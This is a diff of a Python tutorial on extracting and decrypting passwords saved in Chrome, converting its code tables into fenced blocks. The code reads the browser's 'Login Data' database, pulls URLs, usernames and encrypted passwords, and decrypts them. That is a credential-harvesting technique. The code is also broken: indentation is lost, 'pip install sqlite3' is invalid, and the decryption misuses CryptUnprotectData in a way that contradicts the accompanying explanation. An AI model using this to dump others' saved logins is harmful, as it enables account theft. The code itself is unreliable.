@@ -71,13 +71,15 @@ With your virtual environment activated, you can proceed to install the required
 
 Python offers a vast ecosystem of libraries and packages that extend its capabilities. We must install specific libraries to help us interact with Chrome's password storage. Open your command prompt or terminal and run the following commands:
 
-| pip install sqlite3 |
-| :---- |
+```bash
+pip install sqlite3
+```
 
 And 
 
-| pip install pycryptodome |
-| :---- |
+```bash
+pip install pycryptodome
+```
 
 Now that you have set up Python and installed the necessary dependencies, you're ready to venture further into the realm of Chrome password extraction. 
 
@@ -99,8 +101,15 @@ Python comes with the sqlite3 library, which allows us to interact with SQLite d
 
 Example on How to Extract Chrome Password in Python.
 
-| import sqlite3database\_path \= r'C:\\Users\\YourUsername\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'\# Connect to the databaseconn \= sqlite3.connect(database\_path)cursor \= conn.cursor() |
-| :---- |
+```python
+import sqlite3
+
+database_path = r'C:\\Users\\YourUsername\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+
+\# Connect to the database
+conn = sqlite3.connect(database_path)
+cursor = conn.cursor()
+```
 
 Make sure to replace YourUsername with your actual username and database\_path with the path to your system's Chrome password database file.
 
@@ -108,8 +117,20 @@ Make sure to replace YourUsername with your actual username and database\_path w
 
 Now that we are connected to the database, we can execute SQL queries to retrieve the encrypted passwords along with their associated website URLs and usernames. Here's an example:
 
-| \# Execute SQL query to retrieve password datacursor.execute("SELECT origin\_url, username\_value, password\_value FROM logins")\# Fetch all the resultsresults \= cursor.fetchall()\# Iterate through the resultsfor row in results:    url \= row\[0\]    username \= row\[1\]    encrypted\_password \= row\[2\]    \# Decrypt the password and perform further actions |
-| :---- |
+```python
+\# Execute SQL query to retrieve password data
+cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+
+\# Fetch all the results
+results = cursor.fetchall()
+
+\# Iterate through the results
+for row in results:
+    url = row\[0\]
+username = row\[1\]
+encrypted_password = row\[2\]
+\# Decrypt the password and perform further actions
+```
 
 In the code snippet above, we select the columns origin\_url, username\_value, and password\_value from the logins table in the database. The results are then fetched and stored in the results variable. We can iterate through the results and extract the URL, username, and encrypted password for further processing.
 
@@ -117,8 +138,26 @@ In the code snippet above, we select the columns origin\_url, username\_value, a
 
 The passwords stored in Chrome's database are encrypted for security reasons. To unveil their proper form, we need to decrypt them. The pycryptodome library comes to our rescue once again. Here's an example of how to decrypt the passwords:
 
-| from Cryptodome.Cipher import AESimport base64def decrypt\_password(encrypted\_password):    \# Chrome uses the DPAPI (Data Protection API) to encrypt passwords    \# The encrypted password is base64 encoded    encrypted\_password \= base64.b64decode(encrypted\_password)    \# Key used for encryption is stored in the system's DPAPI folder    \# We need to retrieve the key using the \`win32crypt\` library (Windows-only)    import win32crypt    key \= win32crypt.CryptUnprotectData(encrypted\_password, None, None, None, 0)\[1\]    \# Decrypt the password    cipher \= AES.new(key, AES.MODE\_GCM, nonce=encrypted\_password\[3:15\])    decrypted\_password \= cipher.decrypt(encrypted\_password\[15:\])    return decrypted\_password.decode('utf-8') |
-| :---- |
+```python
+from Cryptodome.Cipher import AES
+import base64
+
+def decrypt_password(encrypted_password):
+    \# Chrome uses the DPAPI (Data Protection API) to encrypt passwords
+\# The encrypted password is base64 encoded
+encrypted_password = base64.b64decode(encrypted_password)
+
+\# Key used for encryption is stored in the system's DPAPI folder
+\# We need to retrieve the key using the \`win32crypt\` library (Windows-only)
+import win32crypt
+key = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)\[1\]
+
+\# Decrypt the password
+cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted_password\[3:15\])
+decrypted_password = cipher.decrypt(encrypted_password\[15:\])
+
+return decrypted_password.decode('utf-8')
+```
 
 In the code snippet above, we define a decrypt\_password function that inputs the encrypted password. We decode the base64-encoded password and extract the initialisation vector (IV). With the IV and a predefined key, we create an AES cipher. Finally, we decrypt the password and return it as a string.
 
